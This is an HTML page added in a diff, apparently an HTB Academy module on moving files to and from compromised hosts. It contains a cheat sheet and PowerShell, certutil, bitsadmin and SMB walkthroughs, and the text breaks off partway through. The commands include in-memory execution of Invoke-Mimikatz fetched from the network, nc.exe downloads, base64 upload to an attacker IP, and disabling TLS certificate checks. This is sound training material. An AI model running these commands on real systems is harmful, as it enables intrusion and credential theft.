@@ -1,0 +1,1407 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+
+<h1 id="5-file-transfers">5. File Transfers</h1>
+<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code></td>
+<td>Download a file with PowerShell</td>
+</tr>
+<tr>
+<td><code>IEX (New-Object Net.WebClient).DownloadString('https://&lt;snip&gt;/Invoke-Mimikatz.ps1')</code></td>
+<td>Execute a file in memory using PowerShell</td>
+</tr>
+<tr>
+<td><code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code></td>
+<td>Upload a file with PowerShell</td>
+</tr>
+<tr>
+<td><code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe</code></td>
+<td>Download a file using Bitsadmin</td>
+</tr>
+<tr>
+<td><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></td>
+<td>Download a file using Certutil</td>
+</tr>
+<tr>
+<td><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></td>
+<td>Download a file using Wget</td>
+</tr>
+<tr>
+<td><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></td>
+<td>Download a file using cURL</td>
+</tr>
+<tr>
+<td><code>php -r '$file = file_get_contents("https://&lt;snip&gt;/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'</code></td>
+<td>Download a file using PHP</td>
+</tr>
+<tr>
+<td><code>scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code></td>
+<td>Upload a file using SCP</td>
+</tr>
+<tr>
+<td><code>scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe</code></td>
+<td>Download a file using SCP</td>
+</tr>
+<tr>
+<td><code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"</code></td>
+<td>Invoke-WebRequest using a Chrome User Agent</td>
+</tr>
+</tbody>
+</table>
+<h2 id="file-transfers">File Transfers</h2>
+<hr>
+<p>There are many situations when transferring files to or from a target system is necessary. Let's imagine the following scenario:</p>
+<p><strong>Setting the Stage</strong></p>
+<p>During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control">Application Control Policy</a>. We perform our local enumeration manually and find that we have <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege</a>. We need to transfer a binary to our target machine to escalate privileges using the <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> tool. We then try to use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Certutil</a> to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">Impacket smbserver</a> tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user.</p>
+<p>Understanding different ways to perform file transfers and how networks operate can help us accomplish our goals during an assessment. We must be aware of host controls that may prevent our actions, like application whitelisting or AV/EDR blocking specific applications or activities. File transfers are also affected by network devices such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.</p>
+<p>File transfer is a core feature of any operating system, and many tools exist to achieve this. However, many of these tools may be blocked or monitored by diligent administrators, and it is worth reviewing a range of techniques that may be possible in a given environment.</p>
+<p>This module covers techniques that leverage tools and applications commonly available on Windows and Linux systems. The list of techniques is not exhaustive. The information within this module can also be used as a reference guide when working through other HTB Academy modules, as many of the in-module exercises will require us to transfer files to/from a target host or to/from the provided Pwnbox. Target Windows and Linux machines are provided to complete a few hands-on exercises as part of the module. It is worth utilizing these targets to experiment with as many of the techniques demonstrated in the module sections as possible. Observe the nuances between the different transfer methods and note down situations where they would be helpful. Once you have completed this module, try out the various techniques in other HTB Academy modules and boxes and labs on the HTB main platform.</p>
+<h2 id="windows-file-transfer-methods">Windows File Transfer Methods</h2>
+<hr>
+<h3 id="introduction">Introduction</h3>
+<p>The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. Let's use the <a href="https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/">Microsoft Astaroth Attack</a> blog post as an example of an advanced persistent threat (APT).</p>
+<p>The blog post starts out talking about <a href="https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/">fileless threats</a>. The term <code>fileless</code> suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.</p>
+<p>The <code>Astaroth attack</code> generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic">WMIC tool</a> with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the <a href="https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool">Bitsadmin tool</a>.</p>
+<p>All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32">regsvr32</a> tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the <code>Userinit</code> process. Below is a graphical depiction of the attack.</p>
+<p><img src="storage\modules\24\fig1a-astaroth-attack-chain.png" alt="image"></p>
+<p><a href="https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png">Image source</a></p>
+<p>This is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.</p>
+<p>This section will discuss using some native Windows tools for download and upload operations. Later in the module, we'll discuss <code>Living Off The Land</code> binaries on Windows &amp; Linux and how to use them to perform file transfer operations.</p>
+<hr>
+<h3 id="download-operations">Download Operations</h3>
+<p>We have access to the machine <code>MS02</code>, and we need to download a file from our <code>Pwnbox</code> machine. Let's see how we can accomplish this using multiple File Download methods.</p>
+<p><img src="storage\modules\24\WIN-download-PwnBox.png" alt="image"></p>
+<h3 id="powershell-base64-encode-decode">PowerShell Base64 Encode &amp; Decode</h3>
+<p>Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.</p>
+<p>An essential step in using this method is to ensure the file you encode and decode is correct. We can use <a href="https://man7.org/linux/man-pages/man1/md5sum.1.html">md5sum</a>, a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.</p>
+<p><strong>Pwnbox Check SSH Key MD5 Hash</strong></p>
+<pre><code class="lang-shell-session">[!bash!]$ md5sum id_rsa
+
+<span class="hljs-number">4e301756</span>a07ded0a2dd6953abf015278  id_rsa
+</code></pre>
+<p><strong>Pwnbox Encode SSH Key to Base64</strong></p>
+<pre><code class="lang-shell-session">[!bash!]$ cat id_rsa |base<span class="hljs-number">64</span> -w <span class="hljs-number">0</span>;echo
+
+LS<span class="hljs-number">0</span>tLS<span class="hljs-number">1</span>CRUdJTiBPUEVOU<span class="hljs-number">1</span><span class="hljs-symbol">NIIFBSSVZBVEUgS0</span>VZLS<span class="hljs-number">0</span>tLS<span class="hljs-number">0</span>KYj<span class="hljs-symbol">NCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1</span>dmJtVUFBQUFFY<span class="hljs-name">m05</span>dVpRQUFBQUFBQUFBQkFBQUFsd<span class="hljs-number">0</span>FBQUFkemMyZ<span class="hljs-number">3</span>RjbgpOaEFBQUFBd<span class="hljs-number">0</span>VBQVFBQUFJRUF<span class="hljs-number">6</span>WjE<span class="hljs-number">0</span>dzV<span class="hljs-number">1</span><span class="hljs-symbol">NU9</span>laHR<span class="hljs-number">5</span>SUJQSk<span class="hljs-name">g3</span>T<span class="hljs-name">m9</span>Yai<span class="hljs-number">84</span>YX<span class="hljs-symbol">NHRUcxcHpJbmtiN2</span>hIMldRVGpMQWRYZE<span class="hljs-number">9</span>kC<span class="hljs-symbol">no3</span>YjJtd<span class="hljs-number">0</span>tiSW<span class="hljs-number">56</span>VmtT<span class="hljs-name">M1</span>BUR<span class="hljs-number">3</span>ZseGhDVkRRUmpBYzloQ<span class="hljs-number">3</span>k<span class="hljs-number">1</span>Q<span class="hljs-number">0</span>duW<span class="hljs-symbol">nlLM3</span>U<span class="hljs-number">2</span>TjQ<span class="hljs-number">3</span>RFhURFY<span class="hljs-number">0</span>YUtkcXl<span class="hljs-number">0</span>UTFUQXZZUHQwW<span class="hljs-name">m8</span>KVWh<span class="hljs-number">2</span>bE<span class="hljs-meta">o5</span>YUgxclgzVHUx<span class="hljs-name">M2</span>FRWU<span class="hljs-symbol">NQTVdMc2</span>JOV<span class="hljs-number">2</span>tLWFJzSk<span class="hljs-number">11</span>dTJO<span class="hljs-symbol">NkJoRHVmQThhc0</span>FBQUlRRGJXa<span class="hljs-number">3</span>p<span class="hljs-number">3</span>MjFwTThBQUFBSApj<span class="hljs-name">M05</span>vTFhKellRQUFBSUVBelox<span class="hljs-symbol">NHc1</span>dTVPZWh<span class="hljs-number">0</span>eUlCUEpI<span class="hljs-symbol">N05</span>vWGovOGFzR<span class="hljs-number">0</span>VHMXB<span class="hljs-number">6</span>SW<span class="hljs-number">5</span>rYjdoSDJXUVRqTEFkWGRPZH<span class="hljs-meta">o3</span>CmIybXdLYkluelZrUz<span class="hljs-symbol">NQVEd2</span>bHhoQ<span class="hljs-number">1</span>ZEUVJqQW<span class="hljs-name">M5</span>aE<span class="hljs-symbol">N5</span><span class="hljs-symbol">NUNHblp5</span>Sz<span class="hljs-symbol">N1</span><span class="hljs-symbol">Nk40</span><span class="hljs-symbol">N0</span>RYVERW<span class="hljs-symbol">NGFLZHF5</span>dFExVEF<span class="hljs-number">2</span>WVB<span class="hljs-number">0</span>MFpvVWgKdmxKOWFIMXJY<span class="hljs-name">M1</span>R<span class="hljs-number">1</span>MT<span class="hljs-symbol">NhUVlDUE1</span>XTH<span class="hljs-symbol">NiTldrS1</span>hSc<span class="hljs-number">0</span>p<span class="hljs-symbol">NdXUyTjZCaER1</span>ZkE<span class="hljs-number">4</span>YX<span class="hljs-symbol">NBQUFBREFRQUJBQUFBZ0</span><span class="hljs-symbol">NjQ28</span>zRHB<span class="hljs-attr">VSwpFdCtmWTZjY21</span>JelZhL<span class="hljs-number">2</span><span class="hljs-symbol">NEL1</span>hwTlRsRFZlaktkWVFib<span class="hljs-number">0</span>ZPUFc<span class="hljs-number">5</span>SjBxaUVoOEpyQWlxeXVlQT<span class="hljs-symbol">NNd1</span>hTWF<span class="hljs-symbol">N3</span>d<span class="hljs-number">3</span>BHMkpvOT<span class="hljs-symbol">NPCllVSnNxQXB4</span><span class="hljs-symbol">NlBxbFF6</span>K<span class="hljs-number">3</span>hK<span class="hljs-symbol">NjZEdzl5</span>RWF<span class="hljs-number">1</span>RTA<span class="hljs-number">5</span>OXpodEtpK<span class="hljs-number">0</span>pvMkttVzJzVE<span class="hljs-symbol">Nkbm92</span>Y<span class="hljs-number">3</span>BiK<span class="hljs-number">3</span>Q<span class="hljs-number">3</span>S<span class="hljs-number">2</span>lPcHlwY<span class="hljs-symbol">ndFZ0</span>dJWVkKZW<span class="hljs-number">9</span>VT<span class="hljs-number">2</span>hE<span class="hljs-symbol">NVJyY2</span>s<span class="hljs-number">5</span>Q<span class="hljs-number">3</span>J<span class="hljs-number">2</span>TlFBe<span class="hljs-name">m9</span>BeEFBQUFRUU<span class="hljs-symbol">NGKzBtTXJraklXL09</span>lc<span class="hljs-number">3</span>lJRC<span class="hljs-number">9</span>JQzJ<span class="hljs-symbol">NRGNuNTI0</span>S<span class="hljs-number">2</span><span class="hljs-symbol">NORUZ0</span><span class="hljs-symbol">NUk5</span>b<span class="hljs-number">0</span>ZJMApDcmdY<span class="hljs-symbol">NmNoSlNiVWJsVXFqVEx4</span><span class="hljs-symbol">NmIyblNmSlVWS3</span>pUMXRCVk<span class="hljs-number">1</span>tWEZ<span class="hljs-number">4</span>Vit<span class="hljs-number">0</span>K<span class="hljs-number">0</span>FBQUFRUURzbGZwM<span class="hljs-symbol">nJzVTdtaVMyQnhXWjBNCjY2</span>OEhxblp<span class="hljs-number">1</span>SWc<span class="hljs-number">3</span>WjVLU<span class="hljs-symbol">nFrK1</span>hqWkdqbHVJMkxjalRKZEd<span class="hljs-number">4</span>Z<span class="hljs-number">0</span>VBa<span class="hljs-symbol">nhuZEJqa0</span>F<span class="hljs-number">0</span>MExlOFphbUt<span class="hljs-number">5</span>blV<span class="hljs-number">2</span>aGU<span class="hljs-number">3</span>ekkzL<span class="hljs-number">0</span>FBQUEKUVFEZWZPSVF<span class="hljs-symbol">NZnQ0</span>R<span class="hljs-number">1</span><span class="hljs-symbol">NtaERreWJtbG1</span>IQXRkMUdYVitOQTRG<span class="hljs-symbol">NXQ0</span>UExZYzZOYWRIc<span class="hljs-number">0</span>JTWDJW<span class="hljs-symbol">N0</span>liaFA<span class="hljs-number">1</span>cS<span class="hljs-number">9</span>yV<span class="hljs-name">m5</span>tVHJRZApaUkVJTW<span class="hljs-number">84</span><span class="hljs-symbol">NzRMUkJrY0</span>FqUlZBQUFBRkhCc<span class="hljs-number">1</span>lXbHVkR<span class="hljs-number">1</span>Y<span class="hljs-number">0</span>ZE<span class="hljs-attr">VCamVXSmxjbk53</span>WVdObEFRSURCQVVHCi<span class="hljs-number">0</span>tLS<span class="hljs-number">0</span>tRU<span class="hljs-number">5</span>EIE<span class="hljs-number">9</span>QRU<span class="hljs-number">5</span>TU<span class="hljs-number">0</span>ggUFJJVkFURSBLRVktLS<span class="hljs-number">0</span>tLQo=
+</code></pre>
+<p>We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.</p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt; [<span class="hljs-built_in">IO</span>.File]<span class="hljs-type">::</span>WriteAllBytes(<span class="hljs-string">"C:\Users\Public\id_rsa"</span>, [Convert]<span class="hljs-type">::</span>FromBase64String(<span class="hljs-string">"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="</span>))
+</code></pre>
+<p>Finally, we can confirm if the file was transferred successfully using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2">Get-FileHash</a> cmdlet, which does the same thing that <code>md5sum</code> does.</p>
+<p><strong>Confirming the MD5 Hashes Match</strong></p>
+<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-<span class="hljs-keyword">FileHash</span> <span class="hljs-keyword">C</span>:\Users\Public\id_rsa -Algorithm md5
+
+Algorithm       <span class="hljs-keyword">Hash</span>                                                                   <span class="hljs-keyword">Path</span>
+---------       ----                                                                   ----
+MD5             <span class="hljs-number">4E301756</span>A07DED0A2DD6953ABF015278                                       <span class="hljs-keyword">C</span>:\Users\Public\id_rsa
+</code></pre>
+<p>Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.</p>
+<hr>
+<h3 id="powershell-web-downloads">PowerShell Web Downloads</h3>
+<p>Most companies allow <code>HTTP</code> and <code>HTTPS</code> outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.</p>
+<p>PowerShell offers many file transfer options. In any version of PowerShell, the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0">System.Net.WebClient</a> class can be used to download a file over <code>HTTP</code>, <code>HTTPS</code> or <code>FTP</code>. The following <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0">table</a> describes WebClient methods for downloading data from a resource:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Method</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0">OpenRead</a></td>
+<td>Returns the data from a resource as a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0">Stream</a>.</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0">OpenReadAsync</a></td>
+<td>Returns the data from a resource without blocking the calling thread.</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0">DownloadData</a></td>
+<td>Downloads data from a resource and returns a Byte array.</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0">DownloadDataAsync</a></td>
+<td>Downloads data from a resource and returns a Byte array without blocking the calling thread.</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0">DownloadFile</a></td>
+<td>Downloads data from a resource to a local file.</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0">DownloadFileAsync</a></td>
+<td>Downloads data from a resource to a local file without blocking the calling thread.</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0">DownloadString</a></td>
+<td>Downloads a String from a resource and returns a String.</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0">DownloadStringAsync</a></td>
+<td>Downloads a String from a resource without blocking the calling thread.</td>
+</tr>
+</tbody>
+</table>
+<p>Let's explore some examples of those methods for downloading files using PowerShell.</p>
+<p><strong>PowerShell DownloadFile Method</strong></p>
+<p>We can specify the class name <code>Net.WebClient</code> and the method <code>DownloadFile</code> with the parameters corresponding to the URL of the target file to download and the output file name.</p>
+<p><strong>File Download</strong></p>
+<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; # <span class="hljs-selector-tag">Example</span>: (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadFile</span>(<span class="hljs-string">'&lt;Target File URL&gt;'</span>,<span class="hljs-string">'&lt;Output File Name&gt;'</span>)
+<span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadFile</span>(<span class="hljs-string">'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1'</span>,<span class="hljs-string">'C:\Users\Public\Downloads\PowerView.ps1'</span>)
+
+<span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; # <span class="hljs-selector-tag">Example</span>: (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadFileAsync</span>(<span class="hljs-string">'&lt;Target File URL&gt;'</span>,<span class="hljs-string">'&lt;Output File Name&gt;'</span>)
+<span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadFileAsync</span>(<span class="hljs-string">'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'</span>, <span class="hljs-string">'C:\Users\Public\Downloads\PowerViewAsync.ps1'</span>)
+</code></pre>
+<p><strong>PowerShell DownloadString - Fileless Method</strong></p>
+<p>As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2">Invoke-Expression</a> cmdlet or the alias <code>IEX</code>.</p>
+<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">IEX</span> (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>(<span class="hljs-string">'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'</span>)
+</code></pre>
+<p><code>IEX</code> also accepts pipeline input.</p>
+<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>(<span class="hljs-string">'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'</span>) | <span class="hljs-selector-tag">IEX</span>
+</code></pre>
+<p><strong>PowerShell Invoke-WebRequest</strong></p>
+<p>From PowerShell 3.0 onwards, the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2">Invoke-WebRequest</a> cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name.</p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt; Invoke-WebRequest https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/PowerShellMafia/</span>PowerSploit<span class="hljs-regexp">/dev/</span>Recon<span class="hljs-regexp">/PowerView.ps1 -OutFile PowerView.ps1</span>
+</code></pre>
+<p>Harmj0y has compiled an extensive list of PowerShell download cradles <a href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239">here</a>. It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.</p>
+<p><strong>Common Errors with PowerShell</strong></p>
+<p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.</p>
+<p><img src="storage\modules\24\IE\_settings.png" alt="image"></p>
+<p>This can be bypassed using the parameter <code>-UseBasicParsing</code>.</p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 | IEX
+
+Invoke-WebRequest : <span class="hljs-type">The</span> response content cannot be parsed because the Internet Explorer engine <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">or</span> Internet Explorer<span class="hljs-symbol">'s</span> first-launch configuration <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> complete. Specify the UseBasicParsing parameter <span class="hljs-keyword">and</span> try again.
+<span class="hljs-keyword">At</span> line:<span class="hljs-number">1</span> char:<span class="hljs-number">1</span>
++ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : <span class="hljs-type">NotImplemented</span>: (:) [Invoke-WebRequest], NotSupportedException
++ FullyQualifiedErrorId : <span class="hljs-type">WebCmdletIEDomNotSupportedException</span>,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX
+</code></pre>
+<p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:</p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt; IEX(<span class="hljs-keyword">New</span>-Object Net.WebClient).DownloadString(<span class="hljs-symbol">'https</span>://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+<span class="hljs-keyword">Exception</span> calling <span class="hljs-string">"DownloadString"</span> <span class="hljs-keyword">with</span> <span class="hljs-string">"1"</span> argument(s): <span class="hljs-string">"The underlying connection was closed: Could not establish trust
+relationship for the SSL/TLS secure channel."</span>
+<span class="hljs-keyword">At</span> line:<span class="hljs-number">1</span> char:<span class="hljs-number">1</span>
++ IEX(<span class="hljs-keyword">New</span>-Object Net.WebClient).DownloadString(<span class="hljs-symbol">'https</span>://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : <span class="hljs-type">NotSpecified</span>: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : <span class="hljs-type">WebException</span>
+PS C:\htb&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$<span class="hljs-literal">true</span>}
+</code></pre>
+<hr>
+<h3 id="smb-downloads">SMB Downloads</h3>
+<p>The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.</p>
+<p>We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">smbserver.py</a> from Impacket and then use <code>copy</code>, <code>move</code>, PowerShell <code>Copy-Item</code>, or any other tool that allows connection to SMB.</p>
+<p><strong>Create the SMB Server</strong></p>
+<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+Impacket v0.9.22 - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation
+
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Config file parsed
